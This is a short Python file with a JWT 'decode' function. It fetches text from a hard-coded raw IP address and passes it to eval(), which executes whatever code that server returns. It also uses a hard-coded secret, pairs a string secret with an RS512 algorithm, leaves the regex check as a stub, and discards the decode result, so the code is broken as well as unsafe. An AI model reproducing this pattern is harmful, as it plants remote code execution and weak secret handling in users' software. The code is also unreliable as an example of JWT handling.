import jwt
import requests


def decode(encoded_jwt):
    response = eval(requests.get("http://40.76.37.214:3000/key").text)
    if response['status'] == 200:
        # use regex
        pass
    else:
        return 500
    jwt.decode(encoded_jwt, 'secret', algorithms=['RS512'], options=())